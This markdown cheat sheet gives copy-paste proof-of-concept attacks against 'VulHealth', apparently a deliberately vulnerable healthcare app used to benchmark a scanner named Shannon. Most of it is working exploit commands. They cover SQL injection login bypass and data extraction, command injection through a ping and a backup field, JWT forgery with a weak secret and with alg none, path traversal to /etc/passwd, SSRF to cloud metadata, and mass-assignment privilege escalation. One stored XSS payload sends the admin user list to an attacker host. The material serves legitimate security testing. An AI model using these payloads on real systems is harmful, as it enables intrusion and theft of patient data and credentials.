# VulHealth — Vulnerability Cheat Sheet

Copy-paste PoCs for every intentional vuln. Replace `<token>` with a JWT from `/api/auth/login`.

```bash
# Login to get a token (as alice/patient) — copy .token from response
curl -s -X POST http://localhost:3001/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password"}' | jq -r .token
```

---

## A01 — Broken Access Control

### 1. BOLA — read ANY patient's medical record
`GET /api/records/:id` has no ownership check.
```bash
curl -s http://localhost:3001/api/records/8 \
  -H "Authorization: Bearer <alice_token>" | jq
# → returns record of patient #19 (HIV+ hypertension patient)
```

### 2. IDOR — view any appointment
```bash
curl -s http://localhost:3001/api/appointments/5 \
  -H "Authorization: Bearer <alice_token>" | jq
```

### 3. IDOR — book appointment AS another patient
```bash
curl -s -X POST http://localhost:3001/api/appointments \
  -H "Authorization: Bearer <alice_token>" \
  -H 'Content-Type: application/json' \
  -d '{"patientId": 13, "doctorId": 2, "scheduledAt": "2026-06-01 09:00", "reason":"hi from alice"}'
```

### 4. Admin endpoint without role check — list all users (incl. password hashes!)
```bash
curl -s http://localhost:3001/api/admin/users \
  -H "Authorization: Bearer <alice_token>" | jq
```

### 5. Path traversal — read arbitrary file via upload endpoint
```bash
curl -s "http://localhost:3001/api/upload/file?name=../../../../etc/passwd"
```

### 6. Path traversal — read server log file
```bash
curl -s "http://localhost:3001/api/admin/logs?file=../../../../etc/passwd" \
  -H "Authorization: Bearer <token>"
```

### 7. Open redirect
```bash
curl -sI "http://localhost:3001/api/redirect?url=https://evil.example.com"
curl -sI "http://localhost:3001/api/auth/oauth/callback?redirect=https://evil.example.com"
```

---

## A02 — Cryptographic Failures

### 8. MD5 password hashes leak via admin endpoint
See #4 above. MD5 is crackable with hashcat `-m 0`.

### 9. JWT secret is `"secret"` — forge arbitrary tokens
```bash
# create an admin JWT offline
python3 - <<'PY'
import hmac, hashlib, base64, json, time
def b64(x): return base64.urlsafe_b64encode(x).rstrip(b'=').decode()
header  = b64(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
payload = b64(json.dumps({"id":1,"username":"admin","role":"admin","iat":int(time.time())}).encode())
sig     = b64(hmac.new(b"secret", f"{header}.{payload}".encode(), hashlib.sha256).digest())
print(f"{header}.{payload}.{sig}")
PY
```

### 10. HTTP plain text — no TLS. Credentials travel in clear.
Shannon will flag WSTG-ATHN-01.

---

## A03 — Injection

### 11. SQL Injection — login auth bypass
```bash
curl -s -X POST http://localhost:3001/api/auth/login \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin' OR '1'='1' --\",\"password\":\"x\"}" | jq
```

### 12. SQL Injection — doctor search UNION-based data exfil
```bash
curl -s "http://localhost:3001/api/doctors?q=x%25%27%20UNION%20SELECT%20id%2Cusername%2CpasswordHash%2Crole%2CpasswordHash%2Crole%2CpasswordHash%20FROM%20users%20--%20"
```

### 13. SQL Injection — doctor by id
```bash
curl -s "http://localhost:3001/api/doctors/1%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C(SELECT%20passwordHash%20FROM%20users%20WHERE%20username%3D%27admin%27)"
```

### 14. Command Injection — admin ping
```bash
curl -s -X POST http://localhost:3001/api/admin/ping \
  -H "Authorization: Bearer <admin_token>" \
  -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1; id; uname -a"}'
```

### 15. Command Injection — admin backup (filename → shell)
```bash
curl -s -X POST http://localhost:3001/api/admin/backup \
  -H "Authorization: Bearer <admin_token>" \
  -H 'Content-Type: application/json' \
  -d '{"filename":"ok.db; touch /tmp/pwn"}'
```

### 16. Stored XSS — message body
```bash
curl -s -X POST http://localhost:3001/api/messages \
  -H "Authorization: Bearer <alice_token>" \
  -H 'Content-Type: application/json' \
  -d '{"toUserId":2,"subject":"hi","body":"<img src=x onerror=alert(document.cookie)>"}'
# Dr. Smith opens inbox in browser → XSS fires
```

### 17. Stored XSS — doctor bio (admin sets, patients see)
```bash
# admin updates dr.smith's bio
curl -s -X PUT http://localhost:3001/api/admin/users/2 \
  -H "Authorization: Bearer <admin_token>" \
  -H 'Content-Type: application/json' \
  -d '{"bio":"<script>fetch(`/api/admin/users`).then(r=>r.json()).then(j=>fetch(`http://attacker/?x=`+btoa(JSON.stringify(j))))</script>"}'
# visit http://localhost:4000/doctors/2 → payload fires for every visitor
```

### 18. Stored XSS — medical record notes
Doctor writes record containing `<img src=x onerror=alert(1)>` in notes; when the patient views `/records/:id` → XSS.

### 19. Reflected XSS — search query
Visit http://localhost:4000/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E

---

## A04 — Insecure Design

### 20. No rate limit on login — brute force
Shannon can hammer `/api/auth/login` as fast as it wants.

### 21. Predictable password-reset token (`md5(email + Date.now())`)
Response leaks `debug_token` in dev mode:
```bash
curl -s -X POST http://localhost:3001/api/auth/forgot-password \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@vulhealth.local"}' | jq
```

### 22. Race-condition / no appointment conflict check
Two requests booking the same doctor at the same `scheduledAt` both succeed.

---

## A05 — Security Misconfiguration

### 23. CORS reflects any origin + `credentials: true`
```bash
curl -sI http://localhost:3001/api/users/me -H 'Origin: https://evil.example'
# → Access-Control-Allow-Origin: https://evil.example, Access-Control-Allow-Credentials: true
```

### 24. Verbose errors leak stack trace
Trigger a SQL error, e.g. `/api/doctors?departmentId=abc`. Response contains `stack`.

### 25. Swagger exposed publicly
Visit http://localhost:3001/api-docs — no auth.

### 26. Default creds (admin/admin123, dr.weak/123456, bob/123456)
Shannon WSTG-ATHN-02.

### 27. `debug_token` leaked in forgot-password response (see #21).

---

## A06 — Vulnerable / Outdated Components

### 28. `lodash@4.17.15` — Prototype Pollution (CVE-2019-10744)
Exploitable via `PUT /api/users/me` or `PUT /api/admin/users/:id` because they use `_.merge(current, req.body)`.
```bash
curl -s -X PUT http://localhost:3001/api/users/me \
  -H "Authorization: Bearer <token>" \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}'
```

---

## A07 — Identification & Authentication Failures

### 29. Username enumeration — login returns different error
```bash
curl -s -X POST http://localhost:3001/api/auth/login -d '{"username":"nonexistent","password":"x"}' -H 'Content-Type: application/json'
# → "No account found with username: nonexistent"
curl -s -X POST http://localhost:3001/api/auth/login -d '{"username":"alice","password":"x"}' -H 'Content-Type: application/json'
# → "Invalid password for user: alice"
```

### 30. Weak password policy — `123456` is accepted at register
```bash
curl -s -X POST http://localhost:3001/api/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"weakpw","email":"w@x.com","password":"1"}'
```

### 31. No old-password check on password change
```bash
curl -s -X POST http://localhost:3001/api/users/me/change-password \
  -H "Authorization: Bearer <token>" -H 'Content-Type: application/json' \
  -d '{"newPassword":"new-weak"}'
```

---

## A08 — Software & Data Integrity Failures

### 32. Mass assignment — escalate to admin via profile update
```bash
curl -s -X PUT http://localhost:3001/api/users/me \
  -H "Authorization: Bearer <patient_token>" \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
# then issue a fresh login — new JWT will have role=admin
# (or use the existing token — many admin endpoints only check requireAuth, so even without role change you're already in)
```

### 33. JWT `alg: none` accepted
```bash
# craft a token with alg=none and arbitrary payload
python3 -c '
import base64, json
def b64(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
h = b64(json.dumps({"alg":"none","typ":"JWT"}).encode())
p = b64(json.dumps({"id":1,"username":"admin","role":"admin"}).encode())
print(f"{h}.{p}.")'
# use it as Authorization: Bearer <above>
```

---

## A09 — Security Logging & Monitoring Failures

### 34. No audit log on admin actions, record access, etc.
No endpoint returns audit history. Shannon will note WSTG-CONF category.

---

## A10 — SSRF

### 35. SSRF — fetch instance metadata / internal service via avatar-from-URL
```bash
curl -s -X POST http://localhost:3001/api/users/me/avatar-from-url \
  -H "Authorization: Bearer <token>" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# localhost on other services
curl -s -X POST http://localhost:3001/api/users/me/avatar-from-url \
  -H "Authorization: Bearer <token>" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://localhost:3001/api/admin/users"}'
# response body = leaked user list even if token is a patient
```

### 36. SSRF — admin import endpoint
```bash
curl -s -X POST http://localhost:3001/api/admin/import/departments \
  -H "Authorization: Bearer <token>" \
  -H 'Content-Type: application/json' \
  -d '{"url":"file:///etc/passwd"}'   # axios doesn't support file:// but http(s):// to internal IPs works
```

---

## Bonus / Misc

### 37. Unrestricted file upload — `.html`/`.svg` served with XSS
```bash
echo '<script>alert(document.domain)</script>' > /tmp/evil.html
TOKEN=<your-token>
curl -s -X POST http://localhost:3001/api/upload/avatar \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/evil.html" -F "filename=evil.html"
# then visit http://localhost:3001/uploads/evil.html
```

### 38. Path traversal on upload filename — write outside uploads/
```bash
curl -s -X POST http://localhost:3001/api/upload/avatar \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/evil.html" -F "filename=../../../../tmp/pwn.txt"
```

### 39. Insecure cookie flags
`Set-Cookie: token=...` lacks `HttpOnly`, `Secure`, `SameSite=Strict`.

---

## Expected Shannon coverage

| OWASP | Shannon expected finding? |
|---|---|
| A01 BOLA medical record | ✅ high — this is Shannon's sweet spot |
| A01 IDOR appointment   | ✅ |
| A01 path traversal     | ✅ |
| A02 MD5 / weak JWT     | ⚠️ static analysis — may flag from discovery |
| A03 SQLi login         | ✅ critical |
| A03 SQLi search        | ✅ |
| A03 Cmd Inj ping       | ✅ critical |
| A03 Stored XSS message | ✅ |
| A03 Reflected XSS      | ✅ |
| A05 CORS, verbose err, swagger | ✅ |
| A07 username enum      | ✅ |
| A07 default creds      | ✅ |
| A08 mass assignment    | ✅ |
| A10 SSRF               | ✅ critical |

Total expected findings: **~12-18** depending on Shannon's run-to-run detection.
